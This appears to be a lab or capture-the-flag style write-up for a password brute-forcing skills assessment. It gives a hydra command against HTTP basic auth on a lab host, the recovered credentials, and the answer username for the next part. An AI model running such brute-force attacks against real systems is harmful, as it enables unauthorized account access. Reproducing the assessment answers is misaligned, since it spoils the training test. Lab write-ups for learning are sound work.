The first part of the skills assessment will require you to brute-force the the target instance. Successfully finding the correct login will provide you with the username you will need to start Skills Assessment Part 2.

You might find the following wordlists helpful in this engagement: [usernames.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt) and [passwords.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt)

### Solution
1. What is the password for the basic auth login?
```shell
> hydra -L users.txt -P pass.txt 94.237.58.98 http-get / -s 58468

login: admin   password: Admin123
```

2. After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment?
`satwossh`